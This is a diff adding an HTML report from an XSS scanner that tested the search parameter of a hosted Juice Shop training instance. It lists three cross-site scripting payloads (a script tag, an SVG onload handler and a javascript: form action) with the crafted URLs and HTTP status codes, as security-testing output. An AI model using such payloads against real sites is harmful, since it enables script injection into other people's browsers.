@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<head><meta charset = "utf-8"><title>XSS Scanner Report</title>
+<style>
+body{font-family :system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;margin :20px}
+table{border-collapse :collapse;width :100%}
+td,th{border :1px solid #ccc;padding :8px;vertical-align :top}
+pre{white-space :pre-wrap;word-break :break-all;margin :0}
+h1{font-size :1.4rem}
+</style>
+</head>
+<body>
+<h1>XSS Scanner Report</h1>
+<p>Target : https://juice-shop-2smf.onrender.com/#/search — generated : 2025-11-24T15:04:09.014360+00:00</p>
+<table>
+<thead><tr><th>Param</th><th>Tested Context</th><th>Detected Context</th><th>Payload</th><th>HTTP</th><th>URL</th></tr></thead>
+<tbody>
+<tr><td>q</td><td>text</td><td>attr_value</td><td><pre>&lt;script&gt;alert(&#x27;XSS-8ce20e69&#x27;)&lt;/script&gt;</pre></td><td>200</td><td>https://juice-shop-2smf.onrender.com/?q=%3Cscript%3Ealert%28%27XSS-8ce20e69%27%29%3C%2Fscript%3E#/search</td></tr><tr><td>q</td><td>text</td><td>attr_value</td><td><pre>&lt;svg xmlns=&#x27;http://www.w3.org/2000/svg&#x27; onload=alert(&#x27;XSS-8ce20e69&#x27;)&gt;</pre></td><td>200</td><td>https://juice-shop-2smf.onrender.com/?q=%3Csvg+xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27+onload%3Dalert%28%27XSS-8ce20e69%27%29%3E#/search</td></tr><tr><td>q</td><td>text</td><td>text</td><td><pre>&lt;form action=&#x27;javascript:alert(XSS-8ce20e69)&#x27;&gt;&lt;input type=submit&gt;&lt;/form&gt;</pre></td><td>200</td><td>https://juice-shop-2smf.onrender.com/?q=%3Cform+action%3D%27javascript%3Aalert%28XSS-8ce20e69%29%27%3E%3Cinput+type%3Dsubmit%3E%3C%2Fform%3E#/search</td></tr>
+</tbody>
+</table>
+</body>
+</html>
